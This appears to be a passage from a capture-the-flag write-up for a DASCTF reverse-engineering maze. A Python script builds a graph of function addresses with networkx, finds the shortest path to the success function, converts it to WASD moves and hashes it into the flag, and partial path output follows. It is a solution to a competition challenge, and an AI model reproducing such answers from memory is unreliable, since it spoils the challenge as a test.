[4275280, 4275584, None, None], [4275440, 4275744, None, None], [4275584, 4275904, None, None], [4275744, 4276064, None, None], [4275904, 4276208, None, None], [4276064, 4276368, None, None], [4276208, 4276528, None, None], [4276368, 4276688, None, None], [4276528, 4276848, None, None], [4276688, 4277008, None, None], [4276848, 4277168, None, None], [4277008, 4277328, None, None], [4277168, 4277488, None, None], [4277328, 4277648, None, None], [4277488, 4277808, None, None], [4277648, None, None, 4273840], [None, 4278128, None, 4274320], [4277968, 4278288, None, None], [4278128, 4278448, None, None], [4278288, 4278608, None, None], [4278448, 4278768, None, None], [4278608, 4278928, None, None], [4278768, 4279072, None, None], [4278928, 4279216, None, None], [4279072, 4279376, None, None], [4279216, 4279536, None, None], [4279376, 4279696, None, None], [4279536, 4279840, None, None], [4279696, 4280000, None, None], [4279840, 4280160, None, None], [4280000, 4280304, None, None], [4280160, 4280464, None, None], [4280304, 4280624, None, None], [4280464, 4280784, None, None], [4280624, 4280944, None, None], [4280784, 4281088, None, None], [4280944, 4281248, None, None], [4281088, 4281408, None, None], [4281248, 4281568, None, None], [4281408, 4281728, None, None], [4281568, 4281888, None, None], [4281728, 4282048, None, None], [4281888, 4282208, None, None], [4282048, 4282352, None, None], [4282208, 4282512, None, None], [4282352, 4282656, None, None], [4282512, 4282816, None, None], [4282656, 4282976, None, None], [4282816, 4283136, None, None], [4282976, 4283296, None, None], [4283136, 4283456, None, None], [4283296, 4283616, None, None], [4283456, 4283776, None, None], [4283616, 4283936, None, None], [4283776, 4284096, None, None], [4283936, 4284256, None, None], [4284096, 4284416, None, None], [4284256, 4284576, None, None], [4284416, 4284736, None, None], [4284576, 4284896, None, None], [4284736, None, None, 4274480], [None, 4285216, 4286656, None], [4285056, 4285376, None, None], [4285216, 4285536, None, None], [4285376, 4285696, None, None], [4285536, 4285856, None, None], [4285696, 4286016, None, None], [4285856, 4286176, None, None], [4286016, 4286336, None, None], [4286176, 4286496, None, None], [4286336, None, None, 4274640], [None, None, 4296976, 4285056], [None, 4286976, 4297136, None], [4286816, 4287120, None, None], [4286976, 4287264, None, None], [4287120, 4287424, None, None], [4287264, 4287584, None, None], [4287424, 4287744, None, None], [4287584, 4287904, None, None], [4287744, 4288064, None, None], [4287904, 4288224, None, None], [4288064, 4288384, None, None], [4288224, 4288528, None, None], [4288384, 4288688, None, None], [4288528, 4288848, None, None], [4288688, 4288992, None, None], [4288848, 4289152, None, None], [4288992, 4289312, None, None], [4289152, 4289472, None, None], [4289312, 4289632, None, None], [4289472, 4289792, None, None], [4289632, 4289952, None, None], [4289792, 4290112, None, None], [4289952, 4290272, None, None], [4290112, 4290432, None, None], [4290272, 4290592, None, None], [4290432, 4290752, None, None], [4290592, 4290912, None, None], [4290752, 4291072, None, None], [4290912, 4291232, None, None], [4291072, 4291376, None, None], [4291232, 4291536, None, None], [4291376, 4291696, None, None], [4291536, 4291856, None, None], [4291696, 4292000, None, None], [4291856, 4292144, None, None], [4292000, 4292288, None, None], [4292144, 4292448, None, None], [4292288, 4292608, None, None], [4292448, 4292768, None, None], [4292608, 4292928, None, None], [4292768, 4293088, None, None], [4292928, 4293248, None, None], [4293088, 4293392, None, None], [4293248, 4293552, None, None], [4293392, 4293696, None, None], [4293552, 4293856, None, None], [4293696, 4294016, None, None], [4293856, 4294160, None, None], [4294016, 4294320, None, None], [4294160, 4294480, 4297296, None], [4294320, 4294640, None, None], [4294480, 4294800, None, None], [4294640, 4294944, None, None], [4294800, 4295088, None, None], [4294944, 4295232, None, None], [4295088, 4295392, None, None], [4295232, 4295552, None, None], [4295392, 4295696, None, None], [4295552, 4295856, None, None], [4295696, 4296016, None, None], [4295856, 4296176, None, None], [4296016, 4296336, None, None], [4296176, 4296496, None, None], [4296336, 4296656, None, None], [4296496, 4296816, None, None], [4296656, None, 4297424, None], [None, None, 4297584, 4286656], [None, None, 4297744, 4286816], [None, None, 4297904, 4294320], [None, None, 4299472, 4296816], [None, None, 4300720, 4296976], [None, None, 4302288, 4297136], [None, None, 4308576, 4297296], [None, 4298224, 4308720, None], [4298064, 4298384, None, None], [4298224, 4298528, None, None], [4298384, 4298688, None, None], [4298528, 4298848, None, None], [4298688, 4299008, None, None], [4298848, 4299168, None, None], [4299008, 4299312, None, None], [4299168, 4299472, None, None], [4299312, 4299632, None, 4297424], [4299472, 4299792, None, None], [4299632, 4299936, None, None], [4299792, 4300096, None, None], [4299936, 4300256, None, None], [4300096, 4300416, None, None], [4300256, 4300576, None, None], [4300416, None, None, None], [None, 4300864, None, 4297584], [4300720, 4301024, None, None], [4300864, 4301184, None, None], [4301024, 4301344, None, None], [4301184, 4301504, None, None], [4301344, 4301648, None, None], [4301504, 4301808, None, None], [4301648, 4301968, None, None], [4301808, 4302128, None, None], [4301968, 4302288, None, None], [4302128, 4302448, None, 4297744], [4302288, 4302608, None, None], [4302448, 4302768, None, None], [4302608, 4302912, None, None], [4302768, 4303072, None, None], [4302912, 4303232, None, None], [4303072, 4303392, None, None], [4303232, 4303552, None, None], [4303392, 4303712, None, None], [4303552, 4303872, None, None], [4303712, 4304032, None, None], [4303872, 4304192, None, None], [4304032, 4304352, None, None], [4304192, 4304496, None, None], [4304352, 4304656, None, None], [4304496, 4304816, None, None], [4304656, 4304976, None, None], [4304816, 4305136, None, None], [4304976, 4305296, None, None], [4305136, 4305456, None, None], [4305296, 4305616, None, None], [4305456, 4305776, None, None], [4305616, 4305936, None, None], [4305776, 4306096, None, None], [4305936, 4306256, None, None], [4306096, 4306400, None, None], [4306256, 4306560, None, None], [4306400, 4306720, None, None], [4306560, 4306880, None, None], [4306720, 4307024, None, None], [4306880, 4307184, None, None], [4307024, 4307344, None, None], [4307184, 4307504, None, None], [4307344, 4307664, None, None], [4307504, 4307808, None, None], [4307664, 4307968, None, None], [4307808, 4308128, None, None], [4307968, 4308288, None, None], [4308128, 4308448, None, None], [4308288, None, None, None], [None, None, 4308880, 4297904], [None, None, 4309040, 4298064], [None, None, 4311264, 4308576], [None, None, 4311888, 4308720], [None, 4309360, 4312336, None], [4309200, 4309520, 4312496, None], [4309360, None, 4312624, None], [None, None, 4313872, None], [None, 4309984, 4315312, None], [4309824, None, 4315472, None], [None, 4310304, 4316112, None], [4310144, 4310464, 4316272, None], [4310304, 4310624, 4316432, None], [4310464, 4310784, 4316592, None], [4310624, 4310944, 4316736, None], [4310784, 4311104, 4316896, None], [4310944, None, 4317024, None], [None, 4311424, 4317664, 4308880], [4311264, 4311584, 4317824, None], [4311424, 4311744, 4317984, None], [4311584, None, 4318112, None], [None, None, 4318752, 4309040], [None, 4312176, None, None], [4312048, 4312336, 4318896, None], [4312176, 4312496, None, 4309200], [4312336, 4312624, None, 4309360], [4312496, 4312784, None, 4309520], [4312624, 4312928, None, None], [4312784, 4313088, None, None], [4312928, 4313248, None, None], [4313088, 4313408, None, None], [4313248, 4313568, None, None], [4313408, 4313712, None, None], [4313568, 4313872, 4319056, None], [4313712, 4314032, None, 4309680], [4313872, 4314192, 4319200, None], [4314032, 4314352, None, None], [4314192, 4314512, None, None], [4314352, 4314672, None, None], [4314512, 4314832, None, None], [4314672, 4314992, None, None], [4314832, 4315152, None, None], [4314992, 4315312, 4319328, None], [4315152, 4315472, None, 4309824], [4315312, 4315632, None, 4309984], [4315472, 4315792, 4319472, None], [4315632, 4315952, None, None], [4315792, 4316112, None, None], [4315952, 4316272, None, 4310144], [4316112, 4316432, None, 4310304], [4316272, 4316592, None, 4310464], [4316432, 4316736, 4319616, 4310624], [4316592, 4316896, None, 4310784], [4316736, 4317024, None, 4310944], [4316896, 4317184, None, 4311104], [4317024, 4317344, None, None], [4317184, 4317504, None, None], [4317344, 4317664, 4319760, None], [4317504, 4317824, None, 4311264], [4317664, 4317984, None, 4311424], [4317824, 4318112, None, 4311584], [4317984, 4318272, None, 4311744], [4318112, 4318432, None, None], [4318272, 4318592, None, None], [4318432, 4318752, None, None], [4318592, None, None, 4311888], [None, None, 4319920, 4312176], [None, None, None, 4313712], [None, None, None, 4314032], [None, None, None, 4315152], [None, None, None, 4315632], [None, None, 4320080, 4316592], [None, None, 4320240, 4317504], [None, None, 4321472, 4318896], [None, None, 4321600, 4319616], [None, 4320400, 4321760, 4319760], [4320240, 4320560, None, None], [4320400, 4320720, None, None], [4320560, 4320880, None, None], [4320720, 4321024, None, None], [4320880, 4321184, None, None], [4321024, 4321344, None, None], [4321184, None, None, None], [None, None, None, 4319920], [None, None, 4321904, 4320080], [None, None, None, 4320240], [None, None, None, 4321600]]func_list = [4198480, 4198624, 4198784, 4198944, 4199104, 4199264, 4199424, 4199584, 4199744, 4199904, 4200064, 4200224, 4200384, 4200544, 4200688, 4200848, 4201008, 4201168, 4201312, 4201456, 4201616, 4201776, 4201936, 4202096, 4202240, 4202384, 4202544, 4202704, 4202848, 4203008, 4203168, 4203328, 4203488, 4203648, 4203808, 4203968, 4204128, 4204272, 4204432, 4204592, 4204752, 4204912, 4205056, 4205216, 4205376, 4205536, 4205680, 4205824, 4205984, 4206144, 4206304, 4206448, 4206608, 4206768, 4206928, 4207088, 4207232, 4207392, 4207552, 4207712, 4207872, 4208032, 4208192, 4208352, 4208496, 4208656, 4208816, 4208960, 4209120, 4209280, 4209440, 4209600, 4209760, 4209904, 4210064, 4210224, 4210368, 4210528, 4210688, 4210832, 4210992, 4211152, 4211312, 4211472, 4211632, 4211792, 4211952, 4212112, 4212272, 4212432, 4212592, 4212752, 4212912, 4213072, 4213232, 4213392, 4213552, 4213696, 4213856, 4214016, 4214176, 4214320, 4214480, 4214640, 4214800, 4214960, 4215120, 4215280, 4215440, 4215584, 4215744, 4215904, 4216064, 4216208, 4216352, 4216512, 4216672, 4216832, 4216992, 4217136, 4217296, 4217440, 4217600, 4217760, 4217920, 4218080, 4218240, 4218400, 4218560, 4218720, 4218880, 4219040, 4219200, 4219360, 4219520, 4219680, 4219840, 4219984, 4220144, 4220304, 4220464, 4220608, 4220768, 4220928, 4221088, 4221232, 4221392, 4221552, 4221712, 4221872, 4222032, 4222192, 4222352, 4222496, 4222640, 4222800, 4222928, 4223088, 4223248, 4223408, 4223568, 4223712, 4223856, 4224016, 4224176, 4224336, 4224496, 4224656, 4224816, 4224976, 4225120, 4225264, 4225424, 4225584, 4225744, 4225888, 4226048, 4226208, 4226368, 4226528, 4226688, 4226848, 4227008, 4227168, 4227328, 4227488, 4227648, 4227808, 4227968, 4228112, 4228272, 4228416, 4228576, 4228736, 4228896, 4229056, 4229216, 4229376, 4229520, 4229680, 4229840, 4229984, 4230144, 4230288, 4230448, 4230608, 4230768, 4230928, 4231088, 4231248, 4231408, 4231568, 4231728, 4231888, 4232048, 4232208, 4232368, 4232528, 4232672, 4232832, 4232992, 4233152, 4233312, 4233472, 4233616, 4233776, 4233920, 4234080, 4234240, 4234400, 4234560, 4234720, 4234880, 4235040, 4235200, 4235328, 4235488, 4235632, 4235792, 4235952, 4236112, 4236272, 4236432, 4236576, 4236736, 4236896, 4237056, 4237216, 4237376, 4237520, 4237664, 4237824, 4237984, 4238144, 4238304, 4238464, 4238624, 4238784, 4238944, 4239104, 4239264, 4239424, 4239584, 4239744, 4239904, 4240064, 4240224, 4240368, 4240528, 4240688, 4240848, 4241008, 4241168, 4241312, 4241456, 4241616, 4241776, 4241936, 4242096, 4242256, 4242416, 4242576, 4242736, 4242896, 4243040, 4243200, 4243360, 4243504, 4243664, 4243824, 4243984, 4244144, 4244288, 4244448, 4244608, 4244768, 4244928, 4245072, 4245232, 4245392, 4245536, 4245696, 4245840, 4246000, 4246160, 4246320, 4246480, 4246640, 4246800, 4246960, 4247120, 4247280, 4247440, 4247600, 4247744, 4247904, 4248064, 4248224, 4248384, 4248544, 4248704, 4248864, 4249024, 4249184, 4249344, 4249504, 4249664, 4249824, 4249984, 4250144, 4250304, 4250464, 4250624, 4250784, 4250944, 4251088, 4251248, 4251408, 4251568, 4251712, 4251872, 4252032, 4252192, 4252336, 4252496, 4252656, 4252816, 4252976, 4253136, 4253296, 4253456, 4253616, 4253776, 4253936, 4254096, 4254240, 4254400, 4254544, 4254704, 4254848, 4255008, 4255152, 4255312, 4255472, 4255616, 4255776, 4255936, 4256080, 4256240, 4256400, 4256560, 4256704, 4256848, 4257008, 4257152, 4257312, 4257472, 4257632, 4257760, 4257920, 4258080, 4258240, 4258400, 4258544, 4258704, 4258864, 4259024, 4259184, 4259344, 4259488, 4259648, 4259808, 4259968, 4260128, 4260288, 4260448, 4260592, 4260752, 4260912, 4261072, 4261232, 4261392, 4261552, 4261712, 4261872, 4262032, 4262176, 4262320, 4262480, 4262640, 4262800, 4262960, 4263120, 4263280, 4263440, 4263600, 4263760, 4263920, 4264080, 4264240, 4264400, 4264560, 4264720, 4264880, 4265040, 4265200, 4265344, 4265504, 4265648, 4265792, 4265952, 4266112, 4266272, 4266432, 4266592, 4266752, 4266912, 4267072, 4267232, 4267392, 4267552, 4267712, 4267872, 4268032, 4268192, 4268352, 4268496, 4268656, 4268816, 4268976, 4269136, 4269296, 4269456, 4269616, 4269760, 4269920, 4270080, 4270240, 4270400, 4270560, 4270720, 4270880, 4271040, 4271184, 4271328, 4271488, 4271648, 4271808, 4271968, 4272128, 4272288, 4272448, 4272608, 4272768, 4272928, 4273088, 4273248, 4273392, 4273552, 4273696, 4273840, 4274000, 4274160, 4274320, 4274480, 4274640, 4274800, 4274960, 4275120, 4275280, 4275440, 4275584, 4275744, 4275904, 4276064, 4276208, 4276368, 4276528, 4276688, 4276848, 4277008, 4277168, 4277328, 4277488, 4277648, 4277808, 4277968, 4278128, 4278288, 4278448, 4278608, 4278768, 4278928, 4279072, 4279216, 4279376, 4279536, 4279696, 4279840, 4280000, 4280160, 4280304, 4280464, 4280624, 4280784, 4280944, 4281088, 4281248, 4281408, 4281568, 4281728, 4281888, 4282048, 4282208, 4282352, 4282512, 4282656, 4282816, 4282976, 4283136, 4283296, 4283456, 4283616, 4283776, 4283936, 4284096, 4284256, 4284416, 4284576, 4284736, 4284896, 4285056, 4285216, 4285376, 4285536, 4285696, 4285856, 4286016, 4286176, 4286336, 4286496, 4286656, 4286816, 4286976, 4287120, 4287264, 4287424, 4287584, 4287744, 4287904, 4288064, 4288224, 4288384, 4288528, 4288688, 4288848, 4288992, 4289152, 4289312, 4289472, 4289632, 4289792, 4289952, 4290112, 4290272, 4290432, 4290592, 4290752, 4290912, 4291072, 4291232, 4291376, 4291536, 4291696, 4291856, 4292000, 4292144, 4292288, 4292448, 4292608, 4292768, 4292928, 4293088, 4293248, 4293392, 4293552, 4293696, 4293856, 4294016, 4294160, 4294320, 4294480, 4294640, 4294800, 4294944, 4295088, 4295232, 4295392, 4295552, 4295696, 4295856, 4296016, 4296176, 4296336, 4296496, 4296656, 4296816, 4296976, 4297136, 4297296, 4297424, 4297584, 4297744, 4297904, 4298064, 4298224, 4298384, 4298528, 4298688, 4298848, 4299008, 4299168, 4299312, 4299472, 4299632, 4299792, 4299936, 4300096, 4300256, 4300416, 4300576, 4300720, 4300864, 4301024, 4301184, 4301344, 4301504, 4301648, 4301808, 4301968, 4302128, 4302288, 4302448, 4302608, 4302768, 4302912, 4303072, 4303232, 4303392, 4303552, 4303712, 4303872, 4304032, 4304192, 4304352, 4304496, 4304656, 4304816, 4304976, 4305136, 4305296, 4305456, 4305616, 4305776, 4305936, 4306096, 4306256, 4306400, 4306560, 4306720, 4306880, 4307024, 4307184, 4307344, 4307504, 4307664, 4307808, 4307968, 4308128, 4308288, 4308448, 4308576, 4308720, 4308880, 4309040, 4309200, 4309360, 4309520, 4309680, 4309824, 4309984, 4310144, 4310304, 4310464, 4310624, 4310784, 4310944, 4311104, 4311264, 4311424, 4311584, 4311744, 4311888, 4312048, 4312176, 4312336, 4312496, 4312624, 4312784, 4312928, 4313088, 4313248, 4313408, 4313568, 4313712, 4313872, 4314032, 4314192, 4314352, 4314512, 4314672, 4314832, 4314992, 4315152, 4315312, 4315472, 4315632, 4315792, 4315952, 4316112, 4316272, 4316432, 4316592, 4316736, 4316896, 4317024, 4317184, 4317344, 4317504, 4317664, 4317824, 4317984, 4318112, 4318272, 4318432, 4318592, 4318752, 4318896, 4319056, 4319200, 4319328, 4319472, 4319616, 4319760, 4319920, 4320080, 4320240, 4320400, 4320560, 4320720, 4320880, 4321024, 4321184, 4321344, 4321472, 4321600, 4321760, 4321904]src_node = 0x401050 # 起点target_node = 0x41F1E0 # 终点G = nx.MultiDiGraph() # 生成一张空图，Mul允许2个节点之间存在多个边，Di代表边是有方向的for i in func_list: G.add_node(i) # 添加节点for i, value in enumerate(all_edges): src = func_list[i] for j in value: if j != None: # 不为None,就可以构造一条边 dst = j G.add_edge(src, dst)path = nx.shortest_path(G, source = src_node, target = target_node) # 直接调用此函数就可以求出最短路径经过的那几个节点print(len(path))print([hex(i) for i in path])s = &quot;&quot; for i in range(1, len(path)): # 根据得到的结果来求出每一步走的方向 func_index = func_list.index(path[i - 1]) index = all_edges[func_index].index(path[i]) if index == 0: s += &#x27;a&#x27; elif index == 1: s += &#x27;d&#x27; elif index == 2: s += &#x27;s&#x27; else: s += &#x27;w&#x27;# 成功的地方在41F1E0处# case &#x27;s&#x27;:# result = printf(&quot;Great!!!you got it!flag is DASCTF&#123;md5&#123;your input&#125;\\n&quot;);# break;input_ = s + &#x27;s&#x27;print(input_) # DASCTF&#123;md5&#123;your input&#125;\\n&quot;)print(&quot;DASCTF&#123;%s&#125;&quot; % hashlib.md5(input_.encode()).hexdigest())、 输出 1234496[&#x27;0x401050&#x27;, &#x27;0x4010e0&#x27;, &#x27;0x401180&#x27;, &#x27;0x403460&#x27;, &#x27;0x403500&#x27;, &#x27;0x4035a0&#x27;, &#x27;0x403640&#x27;, &#x27;0x4036e0&#x27;, &#x27;0x403770&#x27;, &#x27;0x403810&#x27;, &#x27;0x4038b0&#x27;, &#x27;0x403940&#x27;, &#x27;0x4039e0&#x27;, &#x27;0x403a80&#x27;, &#x27;0x403b20&#x27;, &#x27;0x403bc0&#x27;, &#x27;0x403c60&#x27;, &#x27;0x403cf0&#x27;, &#x27;0x403d90&#x27;, &#x27;0x403e30&#x27;, &#x27;0x403ec0&#x27;, &#x27;0x403f60&#x27;, &#x27;0x404630&#x27;, &#x27;0x405e20&#x27;, &#x27;0x406450&#x27;, &#x27;0x406eb0&#x27;, &#x27;0x408060&#x27;, &#x27;0x4087c0&#x27;, &#x27;0x4097c0&#x27;, &#x27;0x40a520&#x27;, &#x27;0x40b490&#x27;, &#x27;0x40b970&#x27;, &#x27;0x40ba10&#x27;, &#x27;0x40bab0&#x27;, &#x27;0x40bb50&#x27;, &#x27;0x40bbf0&#x27;, &#x27;0x40bc90&#x27;, &#x27;0x40bd30&#x27;, &#x27;0x40bdd0&#x27;, &#x27;0x40be60&#x27;, &#x27;0x40bf00&#x27;, &#x27;0x40bfa0&#x27;, &#x27;0x40c030&#x27;, &#x27;0x40c0d0&#x27;, &#x27;0x40c170&#x27;, &#x27;0x40c210&#x27;, &#x27;0x40c2b0&#x27;, &#x27;0x40c340&#x27;, &#x27;0x40c3e0&#x27;, &#x27;0x40c480&#x27;, &#x27;0x40c520&#x27;, &#x27;0x40c5c0&#x27;, &#x27;0x40c650&#x27;, &#x27;0x40c6f0&#x27;, &#x27;0x40c790&#x27;, &#x27;0x40c820&#x27;, &#x27;0x40c8c0&#x27;, &#x27;0x40c950&#x27;, &#x27;0x40c9f0&#x27;, &#x27;0x40ca90&#x27;, &#x27;0x40cb30&#x27;, &#x27;0x40cbd0&#x27;, &#x27;0x40cc70&#x27;, &#x27;0x40b530&#x27;, &#x27;0x40ae60&#x27;, &#x27;0x409990&#x27;, &#x27;0x408f10&#x27;, &#x27;0x408240&#x27;, &#x27;0x407990&#x27;, &#x27;0x4078f0&#x27;, &#x27;0x407860&#x27;, &#x27;0x4077d0&#x27;, &#x27;0x407730&#x27;, &#x27;0x407690&#x27;, &#x27;0x4075f0&#x27;, &#x27;0x407550&#x27;, &#x27;0x4074b0&#x27;, &#x27;0x407410&#x27;, &#x27;0x4081a0&#x27;, &#x27;0x408ad0&#x27;, &#x27;0x408b60&#x27;, &#x27;0x408c00&#x27;, &#x27;0x408c90&#x27;, &#x27;0x408d30&#x27;, &#x27;0x408dd0&#x27;, &#x27;0x408e70&#x27;, &#x27;0x409900&#x27;, &#x27;0x40adc0&#x27;, &#x27;0x40ad20&#x27;, &#x27;0x40ac80&#x27;, &#x27;0x40abe0&#x27;, &#x27;0x40ab40&#x27;, &#x27;0x40aaa0&#x27;, &#x27;0x40aa00&#x27;, &#x27;0x40a960&#x27;, &#x27;0x40a8d0&#x27;, &#x27;0x40a840&#x27;, &#x27;0x40a7a0&#x27;, &#x27;0x40a700&#x27;, &#x27;0x40a660&#x27;, &#x27;0x40a5c0&#x27;, &#x27;0x409860&#x27;, &#x27;0x408860&#x27;, &#x27;0x408900&#x27;, &#x27;0x408990&#x27;, &#x27;0x408a30&#x27;, &#x27;0x408100&#x27;, &#x27;0x407370&#x27;, &#x27;0x406590&#x27;, &#x27;0x405f60&#x27;, &#x27;0x404770&#x27;, &#x27;0x404810&#x27;, &#x27;0x4048b0&#x27;, &#x27;0x404950&#x27;, &#x27;0x4049f0&#x27;, &#x27;0x404a90&#x27;, &#x27;0x404b30&#x27;, &#x27;0x404bc0&#x27;, &#x27;0x404c60&#x27;, &#x27;0x404d00&#x27;, &#x27;0x404da0&#x27;, &#x27;0x404e30&#x27;, &#x27;0x404ed0&#x27;, &#x27;0x404f70&#x27;, &#x27;0x405010&#x27;, &#x27;0x4050b0&#x27;, &#x27;0x405150&#x27;, &#x27;0x4051f0&#x27;, &#x27;0x405290&#x27;, &#x27;0x405320&#x27;, &#x27;0x4053c0&#x27;, &#x27;0x405460&#x27;, &#x27;0x405500&#x27;, &#x27;0x405590&#x27;, &#x27;0x405620&#x27;, &#x27;0x4056c0&#x27;, &#x27;0x405760&#x27;, &#x27;0x406000&#x27;, &#x27;0x406630&#x27;, &#x27;0x407a30&#x27;, &#x27;0x4082e0&#x27;, &#x27;0x408fb0&#x27;, &#x27;0x409a30&#x27;, &#x27;0x40af00&#x27;, &#x27;0x40b5d0&#x27;, &#x27;0x40cd10&#x27;, &#x27;0x40d200&#x27;, &#x27;0x40f620&#x27;, &#x27;0x40faf0&#x27;, &#x27;0x410ff0&#x27;, &#x27;0x412270&#x27;, &#x27;0x4126c0&#x27;, &#x27;0x412760&#x27;, &#x27;0x412800&#x27;, &#x27;0x4128a0&#x27;, &#x27;0x412940&#x27;, &#x27;0x4129e0&#x27;, &#x27;0x412a80&#x27;, &#x27;0x412b20&#x27;, &#x27;0x412bc0&#x27;, &#x27;0x412c50&#x27;, &#x27;0x412ce0&#x27;, &#x27;0x412d80&#x27;, &#x27;0x412e20&#x27;, &#x27;0x412ec0&#x27;, &#x27;0x412f60&#x27;, &#x27;0x413000&#x27;, &#x27;0x4130a0&#x27;, &#x27;0x412310&#x27;, &#x27;0x411580&#x27;, &#x27;0x40fcd0&#x27;, &#x27;0x40f880&#x27;, &#x27;0x40d480&#x27;, &#x27;0x40cf90&#x27;, &#x27;0x40b830&#x27;, &#x27;0x40b180&#x27;, &#x27;0x409ca0&#x27;, &#x27;0x409410&#x27;, &#x27;0x408410&#x27;, &#x27;0x407b60&#x27;, &#x27;0x406bb0&#x27;, &#x27;0x406b10&#x27;, &#x27;0x406a70&#x27;, &#x27;0x4069d0&#x27;, &#x27;0x406930&#x27;, &#x27;0x4068a0&#x27;, &#x27;0x406800&#x27;, &#x27;0x406760&#x27;, &#x27;0x406140&#x27;, &#x27;0x4058a0&#x27;, &#x27;0x404450&#x27;, &#x27;0x402c70&#x27;, &#x27;0x402d00&#x27;, &#x27;0x402da0&#x27;, &#x27;0x402e40&#x27;, &#x27;0x402ee0&#x27;, &#x27;0x402f70&#x27;, &#x27;0x403010&#x27;, &#x27;0x4030b0&#x27;, &#x27;0x403150&#x27;, &#x27;0x4031f0&#x27;, &#x27;0x403280&#x27;, &#x27;0x403320&#x27;, &#x27;0x4033c0&#x27;, &#x27;0x4044f0&#x27;, &#x27;0x405930&#x27;, &#x27;0x4061e0&#x27;, &#x27;0x406c50&#x27;, &#x27;0x407c00&#x27;, &#x27;0x4084b0&#x27;, &#x27;0x408540&#x27;, &#x27;0x4094b0&#x27;, &#x27;0x409550&#x27;, &#x27;0x409d40&#x27;, &#x27;0x409de0&#x27;, &#x27;0x40b220&#x27;, &#x27;0x40b8d0&#x27;, &#x27;0x40d160&#x27;, &#x27;0x40d0c0&#x27;, &#x27;0x40d660&#x27;, &#x27;0x40d5c0&#x27;, &#x27;0x40d520&#x27;, &#x27;0x40f920&#x27;, &#x27;0x40fd70&#x27;, &#x27;0x411620&#x27;, &#x27;0x4123b0&#x27;, &#x27;0x413140&#x27;, &#x27;0x413930&#x27;, &#x27;0x4161e0&#x27;, &#x27;0x416140&#x27;, &#x27;0x4160a0&#x27;, &#x27;0x416000&#x27;, &#x27;0x415f60&#x27;, &#x27;0x415ec0&#x27;, &#x27;0x415e20&#x27;, &#x27;0x415d80&#x27;, &#x27;0x415ce0&#x27;, &#x27;0x415c40&#x27;, &#x27;0x415ba0&#x27;, &#x27;0x415b00&#x27;, &#x27;0x415a60&#x27;, &#x27;0x4159c0&#x27;, &#x27;0x415920&#x27;, &#x27;0x415890&#x27;, &#x27;0x4157f0&#x27;, &#x27;0x415760&#x27;, &#x27;0x4156c0&#x27;, &#x27;0x415620&#x27;, &#x27;0x415580&#x27;, &#x27;0x4154e0&#x27;, &#x27;0x415440&#x27;, &#x27;0x4153a0&#x27;, &#x27;0x415300&#x27;, &#x27;0x415270&#x27;, &#x27;0x4151d0&#x27;, &#x27;0x415130&#x27;, &#x27;0x415090&#x27;, &#x27;0x414ff0&#x27;, &#x27;0x414f60&#x27;, &#x27;0x414ec0&#x27;, &#x27;0x414e20&#x27;, &#x27;0x414d90&#x27;, &#x27;0x414cf0&#x27;, &#x27;0x414c50&#x27;, &#x27;0x414bb0&#x27;, &#x27;0x414b20&#x27;, &#x27;0x414a90&#x27;, &#x27;0x4149f0&#x27;, &#x27;0x414950&#x27;, &#x27;0x4148b0&#x27;, &#x27;0x414810&#x27;, &#x27;0x414770&#x27;, &#x27;0x4146d0&#x27;, &#x27;0x413890&#x27;, &#x27;0x4137f0&#x27;, &#x27;0x413750&#x27;, &#x27;0x4136b0&#x27;, &#x27;0x414630&#x27;, &#x27;0x414590&#x27;, &#x27;0x4144f0&#x27;, &#x27;0x414450&#x27;, &#x27;0x4143b0&#x27;, &#x27;0x414310&#x27;, &#x27;0x414270&#x27;, &#x27;0x4141d0&#x27;, &#x27;0x414130&#x27;, &#x27;0x414090&#x27;, &#x27;0x413ff0&#x27;, &#x27;0x413f60&#x27;, &#x27;0x413ec0&#x27;, &#x27;0x413e20&#x27;, &#x27;0x413d80&#x27;, &#x27;0x413cf0&#x27;, &#x27;0x413c50&#x27;, &#x27;0x413bb0&#x27;, &#x27;0x413b10&#x27;, &#x27;0x413a70&#x27;, &#x27;0x413620&#x27;, &#x27;0x412630&#x27;, &#x27;0x411880&#x27;, &#x27;0x4101c0&#x27;, &#x27;0x410260&#x27;, &#x27;0x4102f0&#x27;, &#x27;0x410390&#x27;, &#x27;0x410430&#x27;, &#x27;0x4104d0&#x27;, &#x27;0x410570&#x27;, &#x27;0x410610&#x27;, &#x27;0x4106b0&#x27;, &#x27;0x410750&#x27;, &#x27;0x4107f0&#x27;, &#x27;0x410890&#x27;, &#x27;0x410920&#x27;, &#x27;0x4109b0&#x27;, &#x27;0x410a50&#x27;, &#x27;0x410af0&#x27;, &#x27;0x410b90&#x27;, &#x27;0x410c30&#x27;, &#x27;0x410cd0&#x27;, &#x27;0x410d70&#x27;, &#x27;0x410e10&#x27;, &#x27;0x410eb0&#x27;, &#x27;0x411920&#x27;, &#x27;0x4119c0&#x27;, &#x27;0x411a60&#x27;, &#x27;0x411b00&#x27;, &#x27;0x411ba0&#x27;, &#x27;0x411c40&#x27;, &#x27;0x411ce0&#x27;, &#x27;0x411d80&#x27;, &#x27;0x411e20&#x27;, &#x27;0x411ec0&#x27;, &#x27;0x411f60&#x27;, &#x27;0x412000&#x27;, &#x27;0x4120a0&#x27;, &#x27;0x412140&#x27;, &#x27;0x4121d0&#x27;, &#x27;0x410f50&#x27;, &#x27;0x40fa60&#x27;, &#x27;0x40f580&#x27;, &#x27;0x40f4f0&#x27;, &#x27;0x40f450&#x27;, &#x27;0x40f3c0&#x27;, &#x27;0x40f330&#x27;, &#x27;0x40f290&#x27;, &#x27;0x40f1f0&#x27;, &#x27;0x40f150&#x27;, &#x27;0x40f0c0&#x27;, &#x27;0x40f020&#x27;, &#x27;0x40ef80&#x27;, &#x27;0x40eef0&#x27;, &#x27;0x40ee50&#x27;, &#x27;0x40edb0&#x27;, &#x27;0x40ed20&#x27;, &#x27;0x40ec80&#x27;, &#x27;0x40ebf0&#x27;, &#x27;0x40eb50&#x27;, &#x27;0x40eac0&#x27;, &#x27;0x40ea20&#x27;, &#x27;0x40e990&#x27;, &#x27;0x40e8f0&#x27;, &#x27;0x40e850&#x27;, &#x27;0x40e7b0&#x27;, &#x27;0x40e710&#x27;, &#x27;0x40e670&#x27;, &#x27;0x40e5d0&#x27;, &#x27;0x40e530&#x27;, &#x27;0x40e490&#x27;, &#x27;0x40e3f0&#x27;, &#x27;0x40e350&#x27;, &#x27;0x40e2b0&#x27;, &#x27;0x40e220&#x27;, &#x27;0x40e180&#x27;, &#x27;0x40e0e0&#x27;, &#x27;0x40e040&#x27;, &#x27;0x40dfb0&#x27;, &#x27;0x40df10&#x27;, &#x27;0x40de70&#x27;, &#x27;0x40ddd0&#x27;, &#x27;0x40dd40&#x27;, &#x27;0x40dca0&#x27;, 